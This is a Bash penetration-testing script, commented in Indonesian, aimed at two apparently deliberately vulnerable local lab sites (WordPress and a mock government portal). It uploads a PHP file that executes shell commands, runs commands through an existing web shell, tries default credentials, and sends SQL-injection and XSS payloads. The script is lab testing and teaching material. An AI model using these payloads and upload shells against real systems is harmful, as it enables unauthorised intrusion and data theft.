#!/bin/bash

# =================================================================
# PENTEST MASTER - INTEGRATED PENETRATION TESTING
# =================================================================
# Script terintegrasi untuk pentesting kedua website vulnerable
# =================================================================

# Konfigurasi
WP_URL="http://localhost:8000"
GOV_URL="http://localhost:8080"
WP_ADMIN_URL="$WP_URL/wp-admin"
GOV_ADMIN_URL="$GOV_URL/admin"
WP_UPLOAD_DIR="$WP_URL/wp-content/uploads"
GOV_UPLOAD_DIR="$GOV_URL/uploads"
TEST_DIR="/tmp/vuln_pentest"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Log file
LOG_FILE="/tmp/vuln_pentest.log"

echo -e "${BLUE}=== PENTEST MASTER - INTEGRATED PENETRATION TESTING ===${NC}"
echo -e "Target: WordPress ($WP_URL) & Government Website ($GOV_URL)"
echo -e "Log file: $LOG_FILE"
echo ""

# Reset log file
> "$LOG_FILE"

# Fungsi logging
log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

log_info() {
    log_message "INFO" "$1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
    log_message "SUCCESS" "$1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
    log_message "WARNING" "$1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
    log_message "ERROR" "$1"
}

# Fungsi untuk mengecek apakah website berjalan
check_websites() {
    log_info "1. Mengecek ketersediaan website"
    
    # Check WordPress
    if curl -s -o /dev/null -w "%{http_code}" "$WP_URL" | grep -q "200"; then
        log_success "WordPress dapat diakses"
    else
        log_error "WordPress tidak dapat diakses"
    fi
    
    # Check Government Website
    if curl -s -o /dev/null -w "%{http_code}" "$GOV_URL" | grep -q "200"; then
        log_success "Government website dapat diakses"
    else
        log_error "Government website tidak dapat diakses"
    fi
}

# Fungsi untuk test directory listing
test_directory_listing() {
    log_info "2. Testing Directory Listing"
    
    local wp_dirs=("wp-content/uploads" "wp-content/plugins" "wp-admin")
    local gov_dirs=("uploads" "admin" "public")
    
    # Test WordPress directories
    for dir in "${wp_dirs[@]}"; do
        response=$(curl -s "$WP_URL/$dir/")
        if echo "$response" | grep -q "Index of"; then
            log_warning "WordPress directory listing enabled: $dir"
        else
            log_success "WordPress directory listing disabled: $dir"
        fi
    done
    
    # Test Government website directories
    for dir in "${gov_dirs[@]}"; do
        response=$(curl -s "$GOV_URL/$dir/")
        if echo "$response" | grep -q "Index of"; then
            log_warning "Government directory listing enabled: $dir"
        else
            log_success "Government directory listing disabled: $dir"
        fi
    done
}

# Fungsi untuk test file upload vulnerability
test_file_upload() {
    log_info "3. Testing File Upload Vulnerability"
    
    # Buat direktori test
    mkdir -p "$TEST_DIR"
    
    # Buat file PHP sederhana untuk testing
    cat > "$TEST_DIR/test_shell.php" << 'EOF'
<?php
echo "File upload vulnerability test successful!";
echo "<br>Server: " . $_SERVER['SERVER_SOFTWARE'];
echo "<br>PHP Version: " . phpversion();
echo "<br>Current Directory: " . getcwd();
echo "<br>Files in directory: <pre>" . shell_exec('ls -la') . "</pre>";
?>
EOF
    
    # Test WordPress upload via Contact Form 7
    log_info "Testing WordPress upload via Contact Form 7"
    response=$(curl -s -X POST -F "file=@$TEST_DIR/test_shell.php" "$WP_URL/wp-content/plugins/contact-form-7/upload.php")
    
    if echo "$response" | grep -q "success"; then
        log_warning "WordPress file upload berhasil via Contact Form 7"
    else
        log_success "WordPress file upload gagal via Contact Form 7"
    fi
    
    # Test Government website upload
    log_info "Testing Government website upload"
    response=$(curl -s -X POST -F "file=@$TEST_DIR/test_shell.php" "$GOV_URL/upload.php")
    
    if echo "$response" | grep -q "berhasil diupload"; then
        log_warning "Government website file upload berhasil"
        
        # Test akses file yang diupload
        if curl -s "$GOV_UPLOAD_DIR/test_shell.php" | grep -q "File upload vulnerability test successful"; then
            log_warning "File yang diupload dapat diakses dan dieksekusi"
        else
            log_success "File diupload tapi tidak dapat diakses"
        fi
    else
        log_success "Government website file upload gagal"
    fi
}

# Fungsi untuk test admin panels
test_admin_panels() {
    log_info "4. Testing Admin Panels"
    
    # Test WordPress admin
    if curl -s "$WP_ADMIN_URL/" | grep -q "wp-login"; then
        log_success "WordPress admin panel dapat diakses"
    else
        log_error "WordPress admin panel tidak dapat diakses"
    fi
    
    # Test Government admin
    if curl -s "$GOV_ADMIN_URL/" | grep -q "Admin Login"; then
        log_success "Government admin panel dapat diakses"
    else
        log_error "Government admin panel tidak dapat diakses"
    fi
    
    # Test WordPress login dengan credentials default
    log_info "Testing WordPress admin login"
    response=$(curl -s -X POST -d "log=wordpress-victim&pwd=admin123&wp-submit=Log+In" "$WP_URL/wp-login.php")
    
    if echo "$response" | grep -q "Dashboard"; then
        log_warning "WordPress admin login berhasil dengan credentials default"
    else
        log_success "WordPress admin login gagal dengan credentials default"
    fi
    
    # Test Government admin login
    log_info "Testing Government admin login"
    response=$(curl -s -X POST -d "username=admin&password=admin123" "$GOV_ADMIN_URL/")
    
    if echo "$response" | grep -q "Selamat Datang, Administrator"; then
        log_warning "Government admin login berhasil dengan credentials default"
    else
        log_success "Government admin login gagal dengan credentials default"
    fi
}

# Fungsi untuk test sensitive files
test_sensitive_files() {
    log_info "5. Testing Sensitive Files Access"
    
    local wp_sensitive_files=(
        "sensitive-info.txt"
        "wp-config.php"
        ".htaccess"
        "wp-content/uploads/.htaccess"
    )
    
    local gov_sensitive_files=(
        "sensitive-info.txt"
        ".htaccess"
        "uploads/.htaccess"
        "admin/.htaccess"
    )
    
    # Test WordPress sensitive files
    for file in "${wp_sensitive_files[@]}"; do
        if curl -s -o /dev/null -w "%{http_code}" "$WP_URL/$file" | grep -q "200"; then
            log_warning "WordPress file sensitive dapat diakses: $file"
        else
            log_success "WordPress file sensitive tidak dapat diakses: $file"
        fi
    done
    
    # Test Government sensitive files
    for file in "${gov_sensitive_files[@]}"; do
        if curl -s -o /dev/null -w "%{http_code}" "$GOV_URL/$file" | grep -q "200"; then
            log_warning "Government file sensitive dapat diakses: $file"
        else
            log_success "Government file sensitive tidak dapat diakses: $file"
        fi
    done
}

# Fungsi untuk test shell access
test_shell_access() {
    log_info "6. Testing Shell Access"
    
    # Test shell yang sudah ada di Government website
    if curl -s "$GOV_UPLOAD_DIR/shell.php" | grep -q "Enter command"; then
        log_warning "Government shell file dapat diakses: $GOV_UPLOAD_DIR/shell.php"
        
        # Test command execution
        response=$(curl -s "$GOV_UPLOAD_DIR/shell.php?cmd=whoami")
        if echo "$response" | grep -q "www-data\|root"; then
            log_warning "Command execution berhasil via Government shell"
        else
            log_success "Command execution gagal via Government shell"
        fi
    else
        log_success "Government shell file tidak dapat diakses"
    fi
}

# Fungsi untuk test SQL injection
test_sql_injection() {
    log_info "7. Testing SQL Injection"
    
    # Test SQL injection di WordPress login
    local sql_payloads=(
        "' OR '1'='1"
        "wordpress-victim'--"
        "' UNION SELECT 1,2,3--"
    )
    
    for payload in "${sql_payloads[@]}"; do
        response=$(curl -s -X POST -d "log=wordpress-victim&pwd=$payload&wp-submit=Log+In" "$WP_URL/wp-login.php")
        
        if echo "$response" | grep -q "Dashboard"; then
            log_warning "WordPress SQL injection mungkin berhasil dengan payload: $payload"
        else
            log_success "WordPress SQL injection tidak berhasil dengan payload: $payload"
        fi
    done
    
    # Test SQL injection di Government admin login
    for payload in "${sql_payloads[@]}"; do
        response=$(curl -s -X POST -d "username=admin&password=$payload" "$GOV_ADMIN_URL/")
        
        if echo "$response" | grep -q "Selamat Datang, Administrator"; then
            log_warning "Government SQL injection mungkin berhasil dengan payload: $payload"
        else
            log_success "Government SQL injection tidak berhasil dengan payload: $payload"
        fi
    done
}

# Fungsi untuk test XSS
test_xss() {
    log_info "8. Testing Cross-Site Scripting (XSS)"
    
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
    )
    
    for payload in "${xss_payloads[@]}"; do
        # Test di WordPress Contact Form 7
        response=$(curl -s -X POST -F "your-message=$payload" "$WP_URL/")
        
        if echo "$response" | grep -q "$payload"; then
            log_warning "WordPress XSS payload terdeteksi di response: $payload"
        else
            log_success "WordPress XSS payload tidak terdeteksi: $payload"
        fi
        
        # Test di Government website upload form
        response=$(curl -s -X POST -F "title=$payload" -F "file=@$TEST_DIR/test_shell.php" "$GOV_ADMIN_URL/upload.php")
        
        if echo "$response" | grep -q "$payload"; then
            log_warning "Government XSS payload terdeteksi di response: $payload"
        else
            log_success "Government XSS payload tidak terdeteksi: $payload"
        fi
    done
}

# Fungsi untuk test Contact Form 7 vulnerabilities
test_contact_form7() {
    log_info "9. Testing Contact Form 7 Vulnerabilities"
    
    # Test Contact Form 7 file upload
    log_info "Testing Contact Form 7 file upload vulnerability"
    response=$(curl -s -X POST -F "file=@$TEST_DIR/test_shell.php" "$WP_URL/wp-content/plugins/contact-form-7/upload.php")
    
    if echo "$response" | grep -q "success"; then
        log_warning "Contact Form 7 file upload vulnerability terdeteksi"
    else
        log_success "Contact Form 7 file upload vulnerability tidak terdeteksi"
    fi
    
    # Test Contact Form 7 XSS
    log_info "Testing Contact Form 7 XSS vulnerability"
    response=$(curl -s -X POST -F "your-message=<script>alert('CF7 XSS')</script>" "$WP_URL/")
    
    if echo "$response" | grep -q "<script>alert"; then
        log_warning "Contact Form 7 XSS vulnerability terdeteksi"
    else
        log_success "Contact Form 7 XSS vulnerability tidak terdeteksi"
    fi
}

# Fungsi untuk generate report
generate_report() {
    log_info "10. Membuat laporan pentesting"
    
    local report_file="/tmp/vuln_pentest_report.txt"
    
    cat > "$report_file" << EOF
================================================================
PENTEST MASTER REPORT - VULNERABLE WEB SYSTEM
================================================================
Tanggal: $(date)
Target: WordPress ($WP_URL) & Government Website ($GOV_URL)
Tester: $(whoami)

================================================================
SUMMARY
================================================================
$(grep -E "\[SUCCESS\]|\[WARNING\]|\[ERROR\]" "$LOG_FILE" | tail -30)

================================================================
DETAILED FINDINGS
================================================================
$(cat "$LOG_FILE")

================================================================
RECOMMENDATIONS
================================================================
1. Implementasi validasi file upload yang ketat
2. Nonaktifkan directory listing
3. Hapus file sensitive dari web root
4. Implementasi input sanitization
5. Gunakan HTTPS untuk semua komunikasi
6. Implementasi rate limiting
7. Audit dan monitoring regular
8. Update dependencies secara berkala
9. Hapus atau update Contact Form 7 ke versi terbaru
10. Implementasi strong authentication

================================================================
VULNERABILITIES FOUND
================================================================
$(grep -c "WARNING" "$LOG_FILE") vulnerabilities found
$(grep -c "ERROR" "$LOG_FILE") errors encountered
$(grep -c "SUCCESS" "$LOG_FILE") security measures working

================================================================
EOF
    
    log_success "Laporan tersimpan di: $report_file"
    echo -e "${BLUE}Laporan lengkap tersimpan di: $report_file${NC}"
}

# Fungsi untuk cleanup
cleanup() {
    log_info "11. Melakukan cleanup"
    
    # Hapus file test
    rm -rf "$TEST_DIR"
    
    # Hapus file yang diupload (jika ada)
    curl -s -X POST -d "action=delete&file=test_shell.php" "$GOV_URL/upload.php" > /dev/null 2>&1
    
    log_success "Cleanup selesai"
}

# Main function
main() {
    echo -e "${YELLOW}Memulai penetration testing...${NC}"
    echo ""
    
    # Check websites availability
    check_websites
    
    # Run all tests
    test_directory_listing
    test_file_upload
    test_admin_panels
    test_sensitive_files
    test_shell_access
    test_sql_injection
    test_xss
    test_contact_form7
    
    # Generate report
    generate_report
    
    # Cleanup
    cleanup
    
    log_success "Penetration testing selesai!"
    echo -e "\n${GREEN}Testing selesai! Cek log file untuk detail: $LOG_FILE${NC}"
}

# Jalankan main function
main "$@"
